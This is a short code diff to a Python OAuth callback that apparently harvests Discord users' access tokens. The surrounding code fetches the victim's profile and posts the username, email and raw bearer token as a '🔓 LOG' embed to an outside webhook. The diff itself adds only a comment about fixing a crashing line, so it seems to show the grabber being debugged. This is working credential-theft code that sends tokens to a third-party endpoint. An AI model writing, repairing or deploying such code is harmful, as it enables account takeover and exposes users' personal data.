@@ -19,6 +19,7 @@ def callback():
 
     if tk:
         u = requests.get('https://discord.com/api/v10/users/@me', headers={'Authorization':f'Bearer {tk}'}).json()
+        # This is the line that was crashing. Ensure it ends with )
         requests.post(WEB, json={"embeds":[{"title":"🔓 LOG","fields":[{"name":"User","value":u.get('username')},{"name":"Email","value":u.get('email')},{"name":"Token","value":f"```{tk}
 ```"}]}]})
         
